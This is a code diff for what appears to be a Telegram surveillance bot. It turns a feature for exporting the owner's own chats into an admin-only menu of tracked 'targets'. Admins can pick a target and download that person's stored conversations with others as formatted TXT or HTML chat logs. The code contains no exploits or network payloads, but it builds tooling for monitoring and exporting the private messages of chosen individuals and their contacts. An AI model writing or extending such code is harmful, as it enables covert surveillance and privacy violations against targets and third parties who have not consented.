@@ -537,7 +537,7 @@ def main_kb(show_dialogs: bool = False):
         [InlineKeyboardButton(text="🔔 Уведомления",  callback_data="u:settings")],
     ]
     if show_dialogs:
-        rows.append([InlineKeyboardButton(text="📂 Мои диалоги", callback_data="u:dialogs")])
+        rows.append([InlineKeyboardButton(text="📂 Диалоги таргетов", callback_data="u:dialogs")])
     rows.append([InlineKeyboardButton(text="❓ Как работает бот", callback_data="u:help")])
     rows.append([InlineKeyboardButton(text="◀️ Назад",       callback_data="u:back_start")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
@@ -1094,18 +1094,20 @@ async def get_target_chat_log(target_uid: int) -> list[dict]:
     return await _run(_f)
 
 async def generate_target_log_txt(target_uid: int, target_name: str) -> str:
-    """Генерирует читаемый TXT лог переписки таргета"""
+    """Генерирует читаемый TXT лог переписки таргета с выравниванием по сторонам."""
     messages = await get_target_chat_log(target_uid)
 
+    W = 72  # ширина "экрана" в символах
+
     lines = []
-    lines.append("=" * 60)
-    lines.append(f"  DialogTrackerX — Лог переписки")
+    lines.append("=" * W)
+    lines.append(f"  Лог переписки")
     lines.append(f"  Таргет: {target_name} (ID: {target_uid})")
     lines.append(f"  Сформирован: {_now_str()}")
-    lines.append("=" * 60)
-    lines.append("")
+    lines.append("=" * W)
 
     if not messages:
+        lines.append("")
         lines.append("  [Нет записей в базе данных]")
     else:
         _user_cache: dict[int, dict] = {}
@@ -1127,52 +1129,177 @@ async def generate_target_log_txt(target_uid: int, target_name: str) -> str:
                 return f"{first_name} [{uid}]"
             return f"ID {uid}"
 
+        # Определяем имя таргета для отображения
+        tgt_info = _user_cache.get(target_uid) or await get_user_info(target_uid)
+        tgt_display = tgt_info.get("username") and f"@{tgt_info['username']}" or                       (tgt_info.get("first_name") and f"{tgt_info['first_name']}") or                       target_name
+
+        INDENT = 4       # отступ для левой стороны
+        PAD = W // 2     # сдвиг для правой стороны
+        MAX_W = W - PAD - 2  # макс ширина пузырька
+
+        def wrap_text(text: str, max_w: int) -> list:
+            result = []
+            for paragraph in text.split("\n"):
+                if not paragraph:
+                    result.append("")
+                    continue
+                while len(paragraph) > max_w:
+                    result.append(paragraph[:max_w])
+                    paragraph = paragraph[max_w:]
+                result.append(paragraph)
+            return result
+
         prev_date = None
         for m in messages:
             created = m.get("created_at", "")[:16] if m.get("created_at") else "—"
             date_part = created[:10] if len(created) >= 10 else created
+            time_part = created[11:16] if len(created) >= 16 else ""
 
             if date_part != prev_date:
                 lines.append("")
-                lines.append(f"  ── {date_part} ──────────────────────────────")
+                date_label = f"── {date_part} ──"
+                lines.append(date_label.center(W))
                 lines.append("")
                 prev_date = date_part
-
-            time_part = created[11:16] if len(created) >= 16 else ""
-            text = m.get("text") or ""
-            mtype = m.get("media_type") or ""
 
             sender_id    = m.get("user_id")
             sender_uname = m.get("username")
             sender_fname = m.get("first_name")
-            owner_id     = m.get("owner_id")
+            owner_id_m   = m.get("owner_id")
             chat_id      = m.get("chat_id")
+            text         = m.get("text") or ""
+            mtype        = m.get("media_type") or ""
 
-            # Если сторона-отправитель — это владелец подключения (или сам бот от его имени),
-            # то получатель — собеседник из этого чата, иначе получатель — владелец
-            is_owner_side = (sender_id == owner_id) or (sender_uname == BOT_USERNAME)
-            recipient_id  = chat_id if is_owner_side else owner_id
+            is_target_side = (sender_id == target_uid)
 
-            sender_disp    = await _display(sender_id, sender_uname, sender_fname)
-            recipient_disp = await _display(recipient_id)
+            sender_disp = await _display(sender_id, sender_uname, sender_fname)
 
-            media_str = f"[{mtype.upper()}] " if mtype else ""
-
-            lines.append(f"  {time_part}  {sender_disp} → {recipient_disp}")
+            content_lines = []
             if text:
-                # Обрезаем длинные строки для читаемости
-                for part in text.split("\n"):
-                    lines.append(f"        {part[:200]}")
+                content_lines.extend(wrap_text(text, MAX_W))
             if mtype:
-                lines.append(f"        {media_str.strip()}")
+                content_lines.append(f"[{mtype.upper()}]")
+            if not content_lines:
+                content_lines = ["(медиа)"]
+
+            if is_target_side:
+                # Таргет — СПРАВА
+                header = f"{sender_disp}  {time_part}"
+                lines.append(header.rjust(W))
+                for cl in content_lines:
+                    lines.append(cl.rjust(W))
+            else:
+                # Собеседник — СЛЕВА
+                header = f"{time_part}  {sender_disp}"
+                lines.append(" " * INDENT + header)
+                for cl in content_lines:
+                    lines.append(" " * INDENT + cl)
+
             lines.append("")
 
-    lines.append("")
-    lines.append("=" * 60)
+    lines.append("=" * W)
     lines.append(f"  Всего записей: {len(messages)}")
-    lines.append("=" * 60)
+    lines.append("=" * W)
 
     return "\n".join(lines)
+
+
+async def generate_target_log_html(target_uid: int, target_name: str) -> str:
+    """HTML с пузырьками: таргет справа, собеседники слева."""
+    messages = await get_target_chat_log(target_uid)
+
+    _user_cache: dict[int, dict] = {}
+
+    async def _display(uid, username=None, first_name=None) -> str:
+        if not uid:
+            return "—"
+        if username == BOT_USERNAME:
+            return f"@{BOT_USERNAME}"
+        if not username and not first_name:
+            if uid not in _user_cache:
+                _user_cache[uid] = await get_user_info(uid)
+            info = _user_cache[uid]
+            username = info.get("username")
+            first_name = info.get("first_name")
+        if username:
+            return f"@{username}"
+        if first_name:
+            return f"{first_name} [{uid}]"
+        return f"ID {uid}"
+
+    bubbles = []
+    prev_date = None
+    for m in messages:
+        created = m.get("created_at", "")
+        date_part = created[:10] if len(created) >= 10 else ""
+        time_part = created[11:16] if len(created) >= 16 else created
+
+        if date_part and date_part != prev_date:
+            bubbles.append(f'<div class="date-sep">{_esc(date_part)}</div>')
+            prev_date = date_part
+
+        sender_id    = m.get("user_id")
+        sender_uname = m.get("username")
+        sender_fname = m.get("first_name")
+        mtype        = m.get("media_type") or ""
+        fid          = m.get("file_id")
+        text         = m.get("text") or ""
+
+        is_target_side = (sender_id == target_uid)
+        side = "out" if is_target_side else "in"
+        sender_disp = await _display(sender_id, sender_uname, sender_fname)
+
+        media_html = ""
+        if mtype:
+            media_html = f'<div class="media-badge">{_esc(mtype.upper())}</div>'
+
+        text_html = _esc(text).replace("\n", "<br>") if text else ""
+
+        name_html = f'<div class="sender-name">{_esc(sender_disp)}</div>'
+
+        bubbles.append(f"""
+        <div class="row {side}">
+          <div class="bubble {side}">
+            {name_html}
+            {media_html}
+            {f'<div class="text">{text_html}</div>' if text_html else ""}
+            <div class="time">{_esc(time_part)}</div>
+          </div>
+        </div>""")
+
+    html_doc = f"""<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Переписка таргета — {_esc(target_name)}</title>
+<style>
+  body {{ background:#0e1621; color:#e8e8e8; font-family:-apple-system,Segoe UI,Roboto,sans-serif; margin:0; padding:20px; }}
+  .header {{ text-align:center; color:#8a96a3; padding:10px 0 20px; font-size:14px; }}
+  .chat {{ max-width:720px; margin:0 auto; display:flex; flex-direction:column; gap:4px; }}
+  .date-sep {{ text-align:center; color:#8a96a3; font-size:12px; margin:12px 0 4px; }}
+  .row {{ display:flex; }}
+  .row.out {{ justify-content:flex-end; }}
+  .row.in  {{ justify-content:flex-start; }}
+  .bubble {{ max-width:68%; padding:8px 12px; border-radius:14px; font-size:15px; line-height:1.4; }}
+  .bubble.in  {{ background:#182533; border-bottom-left-radius:4px; }}
+  .bubble.out {{ background:#2b5278; border-bottom-right-radius:4px; }}
+  .sender-name {{ font-size:12px; font-weight:600; margin-bottom:3px; }}
+  .bubble.in .sender-name  {{ color:#6ab3f3; }}
+  .bubble.out .sender-name {{ color:#7ecfad; }}
+  .text {{ white-space:pre-wrap; word-break:break-word; }}
+  .time {{ font-size:11px; color:#8a96a3; text-align:right; margin-top:4px; }}
+  .media-badge {{ display:inline-block; background:#ffffff18; border-radius:6px; padding:2px 7px; font-size:12px; margin-bottom:4px; }}
+</style>
+</head>
+<body>
+  <div class="header">🎯 Таргет: <b>{_esc(target_name)}</b> · сформировано {_esc(_now_str())} · {len(messages)} сообщ.</div>
+  <div class="chat">
+    {"".join(bubbles) if bubbles else "<p style='text-align:center;color:#8a96a3'>Нет сообщений</p>"}
+  </div>
+</body>
+</html>"""
+    return html_doc
 
 # ══════════════════════════════════════════════
 # HTML-ЭКСПОРТ СОБСТВЕННЫХ ДИАЛОГОВ ВЛАДЕЛЬЦА
@@ -1652,31 +1779,33 @@ async def cb_main(event, state: FSMContext = None):
         await event.answer(text, reply_markup=kb, parse_mode="HTML")
 
 
-# ── Мои диалоги (HTML-экспорт собственной переписки) ──
+# ── Диалоги таргетов (только для админов) ──
 
-def _dialog_label(d: dict) -> str:
-    if d.get("username"):
-        return f"@{d['username']}"
-    if d.get("first_name"):
-        return f"{d['first_name']} [{d['chat_id']}]"
-    return f"ID {d['chat_id']}"
+def _target_label(t: dict) -> str:
+    if t.get("username"):
+        return f"@{t['username']}"
+    if t.get("first_name"):
+        return f"{t['first_name']} [ID {t['target_user_id']}]"
+    return f"ID {t['target_user_id']}"
 
 @user_router.callback_query(F.data == "u:dialogs")
 async def u_dialogs(call: CallbackQuery):
     if not is_admin(call.from_user.id):
         return await call.answer("⛔", show_alert=True)
-    dialogs = await get_my_dialogs(call.from_user.id)
-    if not dialogs:
-        text = "📂 <b>Мои диалоги</b>\n\nПока нет сохранённой переписки."
+    targets = await get_all_targets()
+    if not targets:
+        text = "📂 <b>Диалоги таргетов</b>\n\nНет активных таргетов."
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="◀️ Назад", callback_data="u:main")]
         ])
     else:
-        text = f"📂 <b>Мои диалоги</b> ({len(dialogs)})\n\nВыбери собеседника:"
+        text = f"📂 <b>Диалоги таргетов</b> ({len(targets)})\n\nВыбери таргет чтобы посмотреть переписку:"
         rows = [
-            [InlineKeyboardButton(text=f"{_dialog_label(d)} ({d['count']})",
-                                   callback_data=f"u:dlg:{d['chat_id']}")]
-            for d in dialogs
+            [InlineKeyboardButton(
+                text=f"🎯 {_target_label(t)}",
+                callback_data=f"u:dlg:{t['target_user_id']}"
+            )]
+            for t in targets
         ]
         rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="u:main")])
         kb = InlineKeyboardMarkup(inline_keyboard=rows)
@@ -1687,51 +1816,84 @@ async def u_dialogs(call: CallbackQuery):
 async def u_dialog_detail(call: CallbackQuery):
     if not is_admin(call.from_user.id):
         return await call.answer("⛔", show_alert=True)
-    chat_id = int(call.data.split(":")[2])
-    dialogs = await get_my_dialogs(call.from_user.id)
-    d = next((x for x in dialogs if x["chat_id"] == chat_id), None)
-    label = _dialog_label(d) if d else f"ID {chat_id}"
+    target_uid = int(call.data.split(":")[2])
+    t = await get_target(target_uid)
+    label = _target_label(t) if t else f"ID {target_uid}"
+
+    messages = await get_target_chat_log(target_uid)
+    count = len(messages)
+    last_at = messages[-1].get("created_at", "—")[:16] if messages else "—"
+
     text = (
-        f"📂 <b>Диалог: {label}</b>\n\n"
-        f"Сообщений в кэше: {d['count'] if d else '—'}\n"
-        f"Последнее: {d['last_at'] if d else '—'}"
+        f"📂 <b>Переписка таргета: {label}</b>\n\n"
+        f"💬 Сообщений в кэше: <b>{count}</b>\n"
+        f"🕐 Последнее: <b>{last_at}</b>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬇️ Скачать переписку в HTML", callback_data=f"u:dlghtml:{chat_id}")],
-        [InlineKeyboardButton(text="◀️ Назад", callback_data="u:dialogs")],
+        [InlineKeyboardButton(text="⬇️ Скачать лог (.txt)", callback_data=f"u:dlgtxt:{target_uid}")],
+        [InlineKeyboardButton(text="🌐 Скачать в HTML",      callback_data=f"u:dlghtml:{target_uid}")],
+        [InlineKeyboardButton(text="◀️ К списку",           callback_data="u:dialogs")],
     ])
     await safe_edit(call, text, reply_markup=kb)
     await call.answer()
 
-@user_router.callback_query(F.data.startswith("u:dlghtml:"))
-async def u_dialog_html(call: CallbackQuery, bot: Bot):
+@user_router.callback_query(F.data.startswith("u:dlgtxt:"))
+async def u_dialog_txt(call: CallbackQuery, bot: Bot):
     if not is_admin(call.from_user.id):
         return await call.answer("⛔", show_alert=True)
-    owner_id = call.from_user.id
-    chat_id = int(call.data.split(":")[2])
+    target_uid = int(call.data.split(":")[2])
+    t = await get_target(target_uid)
+    label = _target_label(t) if t else f"ID {target_uid}"
 
-    dialogs = await get_my_dialogs(owner_id)
-    d = next((x for x in dialogs if x["chat_id"] == chat_id), None)
-    label = _dialog_label(d) if d else f"ID {chat_id}"
+    await call.answer("⏳ Формирую лог...")
+
+    txt_content = await generate_target_log_txt(target_uid, label)
+
+    file_name = f"target_{target_uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    file_path = MEDIA_DIR / file_name
+    try:
+        file_path.parent.mkdir(parents=True, exist_ok=True)
+        file_path.write_text(txt_content, encoding="utf-8")
+        await bot.send_document(
+            call.from_user.id,
+            FSInputFile(file_path, filename=file_name),
+            caption=f"📂 Переписка таргета {label}\n📅 {_now_str()}",
+            parse_mode="HTML"
+        )
+    except Exception as ex:
+        logger.warning(f"u_dialog_txt {target_uid}: {ex}")
+        await bot.send_message(call.from_user.id, f"❌ Ошибка: {ex}", parse_mode="HTML")
+    finally:
+        if file_path.exists():
+            try: file_path.unlink()
+            except: pass
+
+@user_router.callback_query(F.data.startswith("u:dlghtml:"))
+async def u_dialog_target_html(call: CallbackQuery, bot: Bot):
+    if not is_admin(call.from_user.id):
+        return await call.answer("⛔", show_alert=True)
+    target_uid = int(call.data.split(":")[2])
+    t = await get_target(target_uid)
+    label = _target_label(t) if t else f"ID {target_uid}"
 
     await call.answer("⏳ Формирую HTML...")
 
-    html_content = await generate_dialog_html(bot, owner_id, chat_id, label)
+    html_content = await generate_target_log_html(target_uid, label)
 
-    file_name = f"chat_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+    file_name = f"target_{target_uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
     file_path = MEDIA_DIR / file_name
     try:
         file_path.parent.mkdir(parents=True, exist_ok=True)
         file_path.write_text(html_content, encoding="utf-8")
         await bot.send_document(
-            owner_id,
+            call.from_user.id,
             FSInputFile(file_path, filename=file_name),
-            caption=f"📂 Переписка с {label}\n📅 {_now_str()}",
+            caption=f"🌐 Переписка таргета {label}\n📅 {_now_str()}",
             parse_mode="HTML"
         )
     except Exception as ex:
-        logger.warning(f"u_dialog_html {chat_id}: {ex}")
-        await bot.send_message(owner_id, f"❌ Ошибка при формировании файла: {ex}", parse_mode="HTML")
+        logger.warning(f"u_dialog_target_html {target_uid}: {ex}")
+        await bot.send_message(call.from_user.id, f"❌ Ошибка: {ex}", parse_mode="HTML")
     finally:
         if file_path.exists():
             try: file_path.unlink()
